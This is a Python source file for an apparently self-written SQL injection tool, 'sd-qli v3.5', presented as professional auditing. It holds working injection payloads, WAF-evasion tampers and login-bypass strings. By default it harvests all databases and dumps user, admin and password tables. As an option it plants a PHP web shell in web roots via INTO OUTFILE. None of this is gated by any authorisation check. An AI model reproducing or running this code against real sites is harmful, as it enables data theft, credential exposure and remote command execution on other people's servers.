#!/usr/bin/env python3
"""
sd-qli v3.5 Ultimate Industrial Edition
THE ULTIMATE MISSION: Professional SQLi Auditing & Exfiltration.
Integrating Invicti SQLi Cheat Sheet & OWASP Security Standards.
Preserving Legacy v2.8 Soul + Elite industrial performance.
"""

import requests
import time
import random
import argparse
import sys
import re
import os
import json
import urllib.parse
import string
import hashlib
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Color palette for premium feel
class Colors:
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    WHITE = '\033[97m'
    END = '\033[0m'

class SDQLi:
    def __init__(self, url, method='GET', data=None, headers=None, workers=10, timeout=5, args=None):
        self.url = url
        self.method = method.upper()
        self.data = data # POST data as string or dict
        self.max_workers = workers
        self.timeout = timeout
        self.args = args # Store CLI args for enumeration logic
        
        self.session = requests.Session()
        if headers:
            self.session.headers.update(headers)
        else:
            self.session.headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
            }
        
        self.lock = Lock()
        self.results = {
            'vulnerabilities': [],
            'database_type': None,
            'database_name': None,
            'version': None,
            'user': None,
            'databases': [],
            'tables': [],
            'columns': {},
            'extracted_samples': {},
            'os_shell': False,
            'shell_url': None,
            'login_bypass': False,
            'bypass_payload': None,
            'target_domain': None,
            'union_info': None
        }
        
        self.db_errors = {
            'MySQL': [r"SQL syntax.*?MySQL", r"Warning.*?mysql_.*?", r"valid MySQL result", r"MySqlClient\."],
            'PostgreSQL': [r"PostgreSQL.*?ERROR", r"Warning.*?pg_.*?", r"valid PostgreSQL result", r"Npgsql\."],
            'MSSQL': [r"Driver.*? SQL[\-\_\ ]*Server", r"OLE DB.*? SQL Server", r"\bSQL Server[^&lt;&gt;]+Driver", r"Warning.*?mssql_.*?", r"\bSQL Server[^&lt;&gt;]+[0-9a-fA-F]{8}\b", r"System\.Data\.SqlClient\.SqlException"],
            'SQLite': [r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*?sqlite_.*?", r"Warning.*?SQLite3::"],
            'Oracle': [r"ORA-[0-9]{5}", r"Oracle error", r"Oracle.*?Driver", r"Warning.*?oci_.*?", r"Warning.*?ora_.*?"]
        }
        
        try:
            domain = urllib.parse.urlparse(self.url).netloc.replace(':', '_')
            self.results['target_domain'] = domain if domain else "audit_results"
        except:
            self.results['target_domain'] = "audit_results"

    def _generate_random_name(self, length=8):
        return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

    def _strings_without_quotes(self, s, db='MySQL'):
        """Invicti Concept: Convert strings to hex or char to bypass magic_quotes/WAF"""
        if not s: return "''"
        if db == 'MySQL':
            return "0x" + s.encode().hex()
        elif db == 'MSSQL':
            return " + ".join([f"CHAR({ord(c)})" for c in s]) if len(s) < 50 else f"0x{s.encode().hex()}"
        elif db == 'PostgreSQL':
            return " || ".join([f"CHR({ord(c)})" for c in s])
        elif db == 'Oracle':
            return " || ".join([f"CHR({ord(c)})" for c in s])
        return f"'{s}'"

    def _apply_tamper(self, payload):
        """Bypass WAF with Professional Elite tampers (v3.5)"""
        if not payload: return payload
        # 1. Sequential Comment Jitter (Invicti Style)
        if " " in payload:
            choices = ["/**/", "/*%00*/", "+", "%20", "%0a", "%0d%0a"]
            payload = payload.replace(" ", random.choice(choices))
        
        # 2. Capitalization jitter for keywords
        keywords = ["select", "union", "all", "from", "where", "and", "or", "order", "by", "limit", "sleep", "waitfor"]
        for kw in keywords:
            if kw in payload.lower():
                alt = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in kw)
                payload = re.sub(r'\b'+re.escape(kw)+r'\b', alt, payload, flags=re.IGNORECASE)
        
        # 3. MySQL special comment format (if applicable/detected)
        if self.results['database_type'] == 'MySQL':
             payload = payload.replace("SELECT", "/*!50000SELECT*/")
        
        return payload

    @staticmethod
    def parse_request_file(file_path):
        """Ultra-robust request parser (v1.9)"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                raw_content = f.read()
            if not raw_content.strip(): return None
            all_lines = [l.strip() for l in raw_content.splitlines()]
            valid_lines = [l for l in all_lines if l]
            if not valid_lines: return None
            req_parts = valid_lines[0].split()
            if len(req_parts) < 2: return None
            method, path = req_parts[0], req_parts[1]
            headers, host = {}, ""
            for line in valid_lines[1:]:
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        k, v = parts
                        headers[k.strip()] = v.strip()
                        if k.strip().lower() == 'host': host = v.strip()
            body = ""
            if '\r\n\r\n' in raw_content: body = raw_content.split('\r\n\r\n', 1)[1].strip()
            elif '\n\n' in raw_content: body = raw_content.split('\n\n', 1)[1].strip()
            if not body and method == 'POST':
                for line in valid_lines[1:]:
                    if '=' in line and ':' not in line: body = line ; break
            if not host and 'Host' in headers: host = headers['Host']
            schema = "https://" if "443" in host else "http://"
            url = f"{schema}{host}{path}" if not path.startswith('http') else path
            return {'url': url, 'method': method, 'headers': headers, 'data': body if body else None}
        except Exception as e:
            print(f"{Colors.RED}[!] Parser Error: {e}{Colors.END}")
            return None

    def _print_banner(self):
        banner = f"""{Colors.BLUE}
    ███████╗██████╗         ██████╗ ██╗     ██╗
    ██╔════╝██╔══██╗       ██╔═══██╗██║     ██║
    ███████╗██║  ██║ █████╗██║   ██║██║     ██║
    ╚════██║██║  ██║ ╚════╝██║▄▄ ██║██║     ██║
    ███████║██████╔╝       ╚██████╔╝███████╗██║
    ╚══════╝╚═════╝         ╚══▀▀═╝ ╚══════╝╚═╝
    {Colors.END}                 {Colors.BOLD}v3.5 Ultimate Industrial Edition{Colors.END}
        """
        print(banner)

    def scan_parameter(self, param_name, current_params):
        """Phase 1: Deep scan with Invicti & OWASP Payloads (v3.5)"""
        original_val = current_params[param_name]
        
        # 1. Advanced Error-based Probes
        error_payloads = [
            "'", '"', "\\", "')", '")', "';", "' OR '1'='1", "' OR 1=1--",
            "/*!50000 SELECT 1/0 */", # MySQL version-error detection
            "' AND 1=CONVERT(INT, (SELECT @@VERSION))-- ", # MSSQL Error
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT USER())))-- ", # MySQL
            "' AND 1=CAST((SELECT current_user) AS INT)-- " # PSQL
        ]
        
        print(f"[*] Testing {Colors.YELLOW}Error-based{Colors.END} vectors on {param_name}...")
        for payload in error_payloads:
            current_params[param_name] = f"{original_val}{payload}"
            try:
                r = self.session.get(self.url, params=current_params, timeout=self.timeout) if self.method == 'GET' else self.session.post(self.url, data=current_params, timeout=self.timeout)
                for db_type, errors in self.db_errors.items():
                    for error_regex in errors:
                        if re.search(error_regex, r.text, re.IGNORECASE):
                            with self.lock:
                                self.results['database_type'] = db_type
                                vuln = {'type': 'Error-based', 'db_type': db_type, 'param': param_name, 'payload': payload, 'url': r.url}
                                if vuln not in self.results['vulnerabilities']:
                                    self.results['vulnerabilities'].append(vuln)
                                    print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}{db_type} Error-based{Colors.END}")
                            return True
            except: pass
            finally: current_params[param_name] = original_val

        # 2. Time-based Vectors (Cheat Sheet Optimized)
        time_vectors = {
            'MySQL': ["1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)-- ", "1' AND IF(1=1, SLEEP(2), 0)-- "],
            'PostgreSQL': ["1' AND (SELECT 1 FROM PG_SLEEP(2))-- "],
            'MSSQL': ["1'; WAITFOR DELAY '0:0:2'-- "],
            'Oracle': ["1' AND (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('xyz'),2) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)-- "],
            'Generic': ["1' AND SLEEP(2)-- ", "1\" AND SLEEP(2)-- "]
        }
        
        print(f"[*] Testing {Colors.YELLOW}Time-based{Colors.END} vectors on {param_name}...")
        for db, payloads in time_vectors.items():
            for payload in payloads:
                current_params[param_name] = f"{original_val}{self._apply_tamper(payload)}"
                start_time = time.time()
                try:
                    if self.method == 'GET': self.session.get(self.url, params=current_params, timeout=self.timeout + 3)
                    else: self.session.post(self.url, data=current_params, timeout=self.timeout + 3)
                    if time.time() - start_time >= 1.8:
                        with self.lock:
                            self.results['database_type'] = db
                            vuln = {'type': 'Time-based', 'db_type': db, 'param': param_name, 'payload': payload, 'url': self.url}
                            if vuln not in self.results['vulnerabilities']:
                                self.results['vulnerabilities'].append(vuln)
                                print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}{db} Time-based{Colors.END}")
                        return True
                except: pass
                finally: current_params[param_name] = original_val

        # 3. Boolean-blind Probes (OWASP Style)
        boolean_tests = [
            ("' AND 1=1-- ", "' AND 1=2-- "),
            ('" AND 1=1-- ', '" AND 1=2-- '),
            ("' OR '1'='1", "' OR '1'='2"),
            ("') AND 1=1-- ", "') AND 1=2-- ")
        ]
        print(f"[*] Testing {Colors.YELLOW}Boolean-blind{Colors.END} pairs on {param_name}...")
        for t_pay, f_pay in boolean_tests:
            try:
                current_params[param_name] = f"{original_val}{t_pay}"
                r_t = self.session.get(self.url, params=current_params, timeout=self.timeout) if self.method == 'GET' else self.session.post(self.url, data=current_params, timeout=self.timeout)
                current_params[param_name] = f"{original_val}{f_pay}"
                r_f = self.session.get(self.url, params=current_params, timeout=self.timeout) if self.method == 'GET' else self.session.post(self.url, data=current_params, timeout=self.timeout)
                if abs(len(r_t.text) - len(r_f.text)) > 20:
                    with self.lock:
                        vuln = {'type': 'Boolean-blind', 'param': param_name, 'payload': t_pay, 'url': self.url}
                        if vuln not in self.results['vulnerabilities']:
                            self.results['vulnerabilities'].append(vuln)
                            print(f"  {Colors.GREEN}[+]{Colors.END} Found: {Colors.CYAN}Boolean-blind{Colors.END}")
                    return True
            except: pass
            finally: current_params[param_name] = original_val
            
        return False

    def check_login_bypass(self, params):
        """Aggressive Mode v1.7: Tests for authentication bypass (Invicti MD5 tricks)"""
        if self.method != 'POST': return 
        print(f"[*] {Colors.BOLD}Aggressive Bypass Phase{Colors.END}: Learning failed login behavior...")
        
        fail_keywords = ['invalid', 'failed', 'incorrect', 'error', 'wrong', 'denied', 'unauthorized']
        identified_errors = []
        try:
            dummy = {k: "SD_DUMMY_CRED" for k in params}
            r_fail = self.session.post(self.url, data=dummy, timeout=self.timeout, allow_redirects=False)
            for word in fail_keywords:
                if word in r_fail.text.lower(): identified_errors.append(word)
        except: pass

        bypass_payloads = [
            "' OR '1'='1", "' OR 1=1--", "' OR TRUE--", 
            "admin' --", "admin' #", "admin'/*",
            "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--" # MD5(1234)
        ]
        for payload in bypass_payloads:
            test_params = {k: payload if k.lower() in ['user', 'username', 'login'] else "1234" for k in params}
            try:
                r = self.session.post(self.url, data=test_params, timeout=self.timeout, allow_redirects=False)
                is_success = r.status_code in [301, 302, 303] or any(w in r.text.lower() for w in ['dashboard', 'welcome', 'logout', 'admin'])
                if not is_success and identified_errors:
                    if all(word not in r.text.lower() for word in identified_errors): is_success = True
                if is_success:
                    with self.lock:
                        self.results['login_bypass'] = True
                        self.results['bypass_payload'] = payload
                        print(f" {Colors.GREEN}[+]{Colors.END} {Colors.BOLD}Bypass Success!{Colors.END} Payload: {Colors.YELLOW}{payload}{Colors.END}")
                    return True
            except: pass
        return False

    def find_union_columns(self, param_name, current_params):
        """Phase 2: Deep exploitation with Invicti column discovery (v3.5)"""
        print(f"\n[*] {Colors.BOLD}Phase 2: Starting exploitation on {Colors.CYAN}{param_name}{Colors.END}")
        original_val = current_params[param_name]
        
        # 1. Error-based Column Discovery (MSSQL HAVING/GROUP BY)
        if self.results['database_type'] == 'MSSQL':
            self._error_based_column_mining(param_name, current_params)

        # 2. Sequential ORDER BY Discovery
        print(f"[*] Testing {Colors.YELLOW}ORDER BY{Colors.END} sequential discovery...")
        col_count = 0
        for i in range(1, 41):
            current_params[param_name] = f"{original_val}' ORDER BY {i}-- -"
            try:
                r = self.session.get(self.url, params=current_params, timeout=self.timeout) if self.method == 'GET' else self.session.post(self.url, data=current_params, timeout=self.timeout)
                found_error = False
                for db, errors in self.db_errors.items():
                    for err in errors:
                        if re.search(err, r.text, re.IGNORECASE):
                            col_count = i - 1 ; found_error = True ; break
                    if found_error: break
                if found_error: break
            except: pass
        
        if col_count:
            print(f" {Colors.GREEN}[+]{Colors.END} Found {Colors.BOLD}{col_count}{Colors.END} columns via ORDER BY.")
            reflected = self._check_reflection(param_name, current_params, col_count, prefix="99999")
            if reflected:
                self._start_data_exfiltration(param_name, current_params, col_count, reflected, prefix="99999")
                return True

        # 3. Sequential UNION Discovery
        print(f"[*] Testing {Colors.YELLOW}Sequential UNION{Colors.END} (1-40)...")
        for i in range(1, 41):
             reflected = self._check_reflection(param_name, current_params, i, prefix="99999")
             if reflected:
                 print(f" {Colors.GREEN}[+]{Colors.END} Success: Found {i} columns via UNION.")
                 self._start_data_exfiltration(param_name, current_params, i, reflected, prefix="99999")
                 return True

        # 4. Blind Fallback
        self.blind_manager(param_name, current_params)
        return True

    def _error_based_column_mining(self, param_name, current_params):
        """Invicti Concept: Finding column names using HAVING and GROUP BY (MSSQL)"""
        print(f"[*] Attempting {Colors.YELLOW}HAVING/GROUP BY{Colors.END} column mining...")
        original_val = current_params[param_name]
        found_cols = []
        while True:
            groupby = f" GROUP BY {', '.join(found_cols)}" if found_cols else ""
            payload = f"{original_val}' {groupby} HAVING 1=1-- "
            current_params[param_name] = payload
            try:
                r = self.session.get(self.url, params=current_params, timeout=self.timeout) if self.method == 'GET' else self.session.post(self.url, data=current_params, timeout=self.timeout)
                match = re.search(r"column '(.*?)' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause", r.text, re.IGNORECASE)
                if match:
                    col = match.group(1).split('.')[-1]
                    found_cols.append(col)
                    print(f"  {Colors.GREEN}[+]{Colors.END} Mined Column: {Colors.CYAN}{col}{Colors.END}")
                else: break
            except: break
        current_params[param_name] = original_val

    def _check_reflection(self, param_name, current_params, column_count, prefix=None):
        mark = "REF_COL"
        original_val = current_params[param_name]
        start_val = prefix if prefix else original_val
        cols = [f"'{mark}_{idx}'" for idx in range(1, column_count + 1)]
        payload = f"{start_val}' UNION SELECT {','.join(cols)}-- -"
        current_params[param_name] = payload
        try:
            r = self.session.get(self.url, params=current_params, timeout=self.timeout) if self.method == 'GET' else self.session.post(self.url, data=current_params, timeout=self.timeout)
            reflected = [idx for idx in range(1, column_count + 1) if f"{mark}_{idx}" in r.text]
            if reflected:
                with self.lock: self.results['union_info'] = {'count': column_count, 'reflected': reflected, 'param': param_name}
                return reflected
        except: pass
        return None

    def _start_data_exfiltration(self, param_name, current_params, column_count, reflected_indices, prefix=None):
        ref_idx = reflected_indices[0]
        original_val = current_params[param_name]
        start_val = prefix if prefix else original_val
        db_type = self.results['database_type'] or "MySQL"
        
        print(f" {Colors.GREEN}[+]{Colors.END} Success: Column(s) {Colors.CYAN}{reflected_indices}{Colors.END} reflect data.")
        
        # 3. Extract Identity Info (Cheat Sheet Specifics)
        print(f"[*] Extracting identity info...")
        identity_queries = {
            'MySQL': {'version': 'VERSION()', 'user': 'USER()', 'database': 'DATABASE()'},
            'MSSQL': {'version': '@@VERSION', 'user': 'SUSER_SNAME()', 'database': 'DB_NAME()'},
            'PostgreSQL': {'version': 'VERSION()', 'user': 'USER', 'database': 'CURRENT_DATABASE()'},
            'Oracle': {'version': '(SELECT BANNER FROM V$VERSION WHERE ROWNUM=1)', 'user': 'USER', 'database': 'SYS_CONTEXT(\'USERENV\',\'DB_NAME\')'}
        }
        queries = identity_queries.get(db_type, identity_queries['MySQL'])
        for label, q in queries.items():
            val = self._union_exfil(param_name, current_params, column_count, ref_idx, q, prefix=start_val)
            if val:
                print(f"  {Colors.GREEN}[+]{Colors.END} {label.capitalize()}: {Colors.CYAN}{val}{Colors.END}")
                self.results[label] = val

        # 4. Global Recursive Harvesting
        print(f"[*] Starting full schema exfiltration...")
        self.automate_harvest(param_name, current_params, column_count, ref_idx, prefix=start_val)
        
        self.automate_harvest(param_name, current_params, column_count, ref_idx, prefix=start_val)
        
        if self.args and self.args.os_shell:
            self.check_os_shell(param_name, current_params, column_count, ref_idx)
        current_params[param_name] = original_val

    def automate_harvest(self, param_name, current_params, col_count, ref_idx, prefix=None):
        """Legacy Flags + Global Recursive Harvesting (v3.5)"""
        db_type = self.results['database_type'] or "MySQL"
        
        if self.args and any([self.args.dbs, self.args.tables, self.args.columns, self.args.dump]):
            if self.args.dbs: self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
            if self.args.tables:
                db = self.args.db or self.results['database_name'] or "current"
                self.get_tables(param_name, current_params, col_count, ref_idx, db=db, prefix=prefix)
            if self.args.columns:
                if not self.args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
                else: self.get_columns(param_name, current_params, col_count, ref_idx, self.args.table, db=self.args.db, prefix=prefix)
            if self.args.dump:
                if not self.args.table: print(f"{Colors.RED}[!] Specify table with -T.{Colors.END}")
                else: self.dump_table(param_name, current_params, col_count, ref_idx, self.args.table, cols=self.args.col.split(',') if self.args.col else None, db=self.args.db, prefix=prefix)
            return

        # Global Recursion (Industrial Default)
        print(f"[*] {Colors.BOLD}Global Recursion{Colors.END}: Harvesting all databases...")
        self.get_databases(param_name, current_params, col_count, ref_idx, prefix=prefix)
        
        target_dbs = [db for db in self.results['databases'] if db.lower() not in ['information_schema', 'mysql', 'performance_schema', 'sys', 'master', 'model', 'msdb', 'tempdb']]
        if not target_dbs: target_dbs = [self.results['database_name'] or "current"]

        for db in target_dbs:
            print(f"\n[*] Processing Database: {Colors.BOLD}{Colors.YELLOW}{db}{Colors.END}")
            tables = self.get_tables(param_name, current_params, col_count, ref_idx, db=db, prefix=prefix)
            
            high_value = ['user', 'staff', 'admin', 'account', 'pass', 'client', 'member', 'login']
            for table in tables:
                if any(k in table.lower() for k in high_value):
                    print(f"[*] {Colors.GREEN}Identifying High-Value table{Colors.END}: {Colors.BOLD}{table}{Colors.END}")
                    self.dump_table(param_name, current_params, col_count, ref_idx, table, db=db, prefix=prefix)

    def get_databases(self, param_name, current_params, col_count, ref_idx, prefix=None):
        print(f"[*] Fetching available databases...")
        db_type = self.results['database_type'] or "MySQL"
        queries = {
            'MySQL': "(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)",
            'MSSQL': "(SELECT name + ',' FROM sys.databases FOR XML PATH(''))",
            'PostgreSQL': "(SELECT string_agg(datname, ',') FROM pg_database)",
            'Oracle': "(SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username) FROM all_users)"
        }
        res = self._union_exfil(param_name, current_params, col_count, ref_idx, queries.get(db_type, queries['MySQL']), prefix=prefix, marker="DBS")
        if res:
            dbs = [d.strip() for d in res.split(',') if d.strip()]
            print(f" {Colors.GREEN}[+]{Colors.END} Databases Found [{len(dbs)}]: {Colors.CYAN}{dbs}{Colors.END}")
            with self.lock: self.results['databases'] = dbs
            return dbs
        return []

    def get_tables(self, param_name, current_params, col_count, ref_idx, db=None, prefix=None):
        db_type = self.results['database_type'] or "MySQL"
        db_query = ""
        if db_type == 'MySQL': db_query = f"(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}')" if db and db != "current" else "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())"
        elif db_type == 'MSSQL': db_query = f"(SELECT name + ',' FROM {db}.sys.objects WHERE type='U' FOR XML PATH(''))" if db and db != "current" else "(SELECT name + ',' FROM sys.objects WHERE type='U' FOR XML PATH(''))"
        else: db_query = f"(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db}')"
        
        res = self._union_exfil(param_name, current_params, col_count, ref_idx, db_query, prefix=prefix, marker="TBL")
        if res:
            tables = [t.strip() for t in res.split(',') if t.strip()]
            print(f" {Colors.GREEN}[+]{Colors.END} Tables in '{db or 'current'}': {Colors.CYAN}{tables}{Colors.END}")
            with self.lock:
                for t in tables:
                    full_name = f"{db}.{t}" if db else t
                    if full_name not in self.results['tables']: self.results['tables'].append(full_name)
            return tables
        return []

    def get_columns(self, param_name, current_params, col_count, ref_idx, table, db=None, prefix=None):
        print(f"[*] Fetching columns for table '{Colors.CYAN}{table}{Colors.END}'...")
        db_type = self.results['database_type'] or "MySQL"
        col_query = ""
        if db_type == 'MySQL': col_query = f"(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'" + (f" AND table_schema='{db}'" if db else "") + ")"
        elif db_type == 'MSSQL': col_query = f"(SELECT name + ',' FROM {db if db else 'master'}.sys.columns WHERE id=(SELECT id FROM {db if db else 'master'}.sys.objects WHERE name='{table}') FOR XML PATH(''))"
        else: col_query = f"(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}')"
        
        res = self._union_exfil(param_name, current_params, col_count, ref_idx, col_query, prefix=prefix, marker="COL")
        if res:
            cols = [c.strip() for c in res.split(',') if c.strip()]
            print(f" {Colors.GREEN}[+]{Colors.END} Columns: {Colors.CYAN}{cols}{Colors.END}")
            with self.lock: self.results['columns'][table] = cols
            return cols
        return []

    def dump_table(self, param_name, current_params, col_count, ref_idx, table, cols=None, db=None, prefix=None):
        if not cols: cols = self.get_columns(param_name, current_params, col_count, ref_idx, table, db, prefix)
        if not cols: return
        print(f"[*] Dumping 20-row sample for table '{Colors.CYAN}{table}{Colors.END}'...")
        db_type = self.results['database_type'] or "MySQL"
        col_list = f"CONCAT_WS(0x7c, {','.join(cols)})" if db_type == 'MySQL' else " + '|' + ".join(cols)
        db_prefix = f"{db}." if db else ""
        dump_query = f"(SELECT GROUP_CONCAT({col_list} SEPARATOR 0x0a) FROM {db_prefix}{table} LIMIT 20)"
        if db_type == 'MSSQL': dump_query = f"(SELECT TOP 20 {col_list} FROM {db_prefix}{table})"
        
        res = self._union_exfil(param_name, current_params, col_count, ref_idx, dump_query, prefix=prefix, marker="DUMP")
        if res:
            rows = res.strip().split('\n')
            print(f" {Colors.GREEN}[+]{Colors.END} Dumped {len(rows)} entries from {table}:")
            print("-" * 55)
            print(f" | {' | '.join(cols)}")
            print("-" * 55)
            for row in rows: print(f" | {row.replace('|', ' | ')}")
            print("-" * 55)
            with self.lock: self.results['extracted_samples'][f"{db}.{table}" if db else table] = rows

    def _union_exfil(self, param_name, current_params, col_count, ref_idx, query, prefix="99999", marker="X"):
        mk = marker + "_" + self._generate_random_name(4).upper()
        cols = [f"'{i}'" for i in range(1, col_count + 1)]
        # Invicti Concept: Strings without quotes (Bypass)
        concat_logic = f"CONCAT({self._strings_without_quotes(mk, self.results['database_type'])}, {query}, {self._strings_without_quotes(mk, self.results['database_type'])})"
        if self.results['database_type'] == 'MSSQL': concat_logic = f"{self._strings_without_quotes(mk, 'MSSQL')} + CAST({query} AS VARCHAR(8000)) + {self._strings_without_quotes(mk, 'MSSQL')}"
        
        cols[ref_idx-1] = concat_logic
        payload = f"{prefix}' UNION SELECT {','.join(cols)}-- -"
        current_params[param_name] = payload
        try:
            r = self.session.get(self.url, params=current_params, timeout=self.timeout) if self.method == 'GET' else self.session.post(self.url, data=current_params, timeout=self.timeout)
            match = re.search(f"{mk}(.*?){mk}", r.text, re.DOTALL)
            return match.group(1).strip() if match else None
        except: return None

    def blind_manager(self, param_name, current_params):
        print(f"[*] Starting Time-based Blind Exfiltration (Binary Search)...")
        tasks = [('database_name', 'DATABASE()'), ('user', 'USER()')]
        for label, q in tasks:
            res = self.blind_exfiltrate(param_name, current_params, q, label)
            with self.lock: self.results[label] = res

    def blind_exfiltrate(self, param_name, current_params, query, label):
        extracted = ""
        print(f"  {Colors.YELLOW}[*]{Colors.END} {label}: ", end="", flush=True)
        # Invicti Binary Search Strategy
        template = f"' AND (SELECT 1 FROM (SELECT(SLEEP(IF(ASCII(SUBSTR(({query}),{{pos}},1))>{{mid}},1.5,0))))a)-- -"
        for pos in range(1, 64):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                payload = template.format(pos=pos, mid=mid)
                current_params[param_name] = payload
                start = time.time()
                try: self.session.get(self.url, params=current_params, timeout=4) if self.method == 'GET' else self.session.post(self.url, data=current_params, timeout=4)
                except: pass
                if time.time() - start >= 1.2: low = mid + 1
                else: high = mid - 1
            if low > 126: break
            char = chr(low)
            extracted += char
            print(f"{Colors.GREEN}{char}{Colors.END}", end="", flush=True)
        print()
        return extracted

    def check_os_shell(self, param_name, current_params, col_count, ref_idx):
        if self.results['database_type'] != 'MySQL': return # INTO OUTFILE is MySQL specific in this engine
        print(f"[*] Testing {Colors.YELLOW}INTO OUTFILE{Colors.END} shell creation...")
        sh_name, sh_code = "sd-audit.php", "<?php system($_GET['cmd']); ?>"
        cols = [f"'{i}'" for i in range(1, col_count + 1)]
        cols[ref_idx-1] = f"'{sh_code}'"
        for p in ["/var/www/html/", "C:/xampp/htdocs/", "/var/www/"]:
            pay = f"99999' UNION SELECT {','.join(cols)} INTO OUTFILE '{p}{sh_name}'-- -"
            current_params[param_name] = pay
            try:
                self.session.get(self.url, params=current_params, timeout=2)
                chk = f"{self.url.rsplit('/', 1)[0]}/{sh_name}"
                if self.session.get(chk, timeout=2).status_code == 200:
                    self.results['os_shell'], self.results['shell_url'] = True, chk
                    print(f" {Colors.GREEN}[+]{Colors.END} OS Shell: {chk}")
                    break
            except: pass

    def _generate_report(self):
        domain = self.results['target_domain']
        if not os.path.exists(domain): os.makedirs(domain)
        print(f"\n[*] {Colors.YELLOW}Generating Professional Industrial Bounty Reports in {domain}/{Colors.END}...")
        
        for i, v in enumerate(self.results['vulnerabilities'], 1):
            report_path = os.path.join(domain, f"bounty_SQLi_REPORT_{i}.txt")
            with open(report_path, "w") as f:
                f.write(f"BUG BOUNTY REPORT: SQL Injection ({v['type']})\n")
                f.write("="*75 + "\n")
                f.write(f"DATE: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"TARGET: {self.url}\n")
                f.write(f"SEVERITY: Critical (CVSS 10.0)\n")
                f.write(f"OWASP ID: A03:2021-Injection\n\n")
                
                f.write("SUMMARY:\n")
                f.write(f"A {v['type']} SQL Injection vulnerability was discovered on the '{v['param']}' parameter. ")
                f.write("This allows an attacker to bypass security controls and interact directly with the backend database.\n\n")
                
                f.write("STEP-BY-STEP REPRODUCTION:\n")
                f.write("1. Perform an audit of the target URL using the industrial scanner.\n")
                f.write(f"2. Inject the following payload into the '{v['param']}' parameter:\n")
                f.write(f"   Payload: {v['payload']}\n")
                f.write(f"3. Note the response change (Error-based/Time-based/Boolean) confirming vulnerability.\n")
                f.write(f"4. Utilize UNION-based exfiltration to recover data from the '{self.results.get('database_name', 'current')}' database.\n\n")
                
                f.write("PROOF OF CONCEPT (cURL):\n")
                if self.method == 'GET': f.write(f"curl -i \"{self.url}?{v['param']}={urllib.parse.quote(v['payload'])}\"\n\n")
                else: f.write(f"curl -i -X POST -d \"{v['param']}={v['payload']}\" {self.url}\n\n")
                
                f.write("EVIDENCE (EXTRACTED CONTEXT):\n")
                f.write(f"- DB Type: {self.results.get('database_type', 'Unknown')}\n")
                f.write(f"- Version: {self.results.get('version', 'Unknown')}\n")
                f.write(f"- DB User: {self.results.get('user', 'Unknown')}\n")
                f.write(f"- Databases: {', '.join(self.results.get('databases', []))}\n\n")
                f.write("REMEDIATION:\n1. Use Parameterized Queries (Prepared Statements).\n2. Implement robust input sanitization.\n")
                f.write("="*75 + "\n")

        for table, rows in self.results['extracted_samples'].items():
            with open(os.path.join(domain, f"dump_{table.replace('.', '_')}.txt"), "w") as f:
                f.write(f"INDUSTRIAL DATA EVIDENCE SAMPLE: {table}\n{'='*75}\n" + "\n".join(rows) + "\n" + "="*75 + "\n")

        with open(os.path.join(domain, "findings.json"), "w") as f: json.dump(self.results, f, indent=4)
        print(f"[+] {Colors.GREEN}Professional Bounty Reports Generated!{Colors.END}")

    def run(self):
        self._print_banner()
        params = {}
        if self.method == 'GET':
            parsed = urllib.parse.urlparse(self.url)
            params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
            self.url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        else:
            if isinstance(self.data, str): params = dict(urllib.parse.parse_qsl(self.data, keep_blank_values=True))
            elif isinstance(self.data, dict): params = self.data
        if not params: print(f"{Colors.RED}[!] No parameters found.{Colors.END}") ; return
        
        print(f"[*] Target: {Colors.CYAN}{self.url}{Colors.END}")
        print(f"[*] Method: {Colors.YELLOW}{self.method}{Colors.END}")
        print("-" * 75)
        
        if self.method == 'POST': self.check_login_bypass(params.copy())
        
        print(f"[*] Phase 1: Deep Scanning {len(params)} parameters...")
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            for p in params: executor.submit(self.scan_parameter, p, params.copy())
            
        if self.results['vulnerabilities']:
            vuln_p = self.results['vulnerabilities'][0]['param']
            self.find_union_columns(vuln_p, params.copy())
            self._generate_report()
            self.display_summary()
        else: print(f"\n{Colors.RED}[-] No SQLi vulnerabilities discovered.{Colors.END}")

    def display_summary(self):
        print("\n" + "="*75 + f"\n{Colors.BOLD}EXPLOITATION SUMMARY{Colors.END}\n" + "="*75)
        for v in self.results['vulnerabilities']: print(f"{Colors.GREEN}[+] {v['type']}{Colors.END} on {Colors.CYAN}{v['param']}{Colors.END}")
        if self.results['database_name']: print(f"\n{Colors.CYAN}DB: {self.results['database_name']} | User: {self.results['user']} | Type: {self.results['database_type']}{Colors.END}")
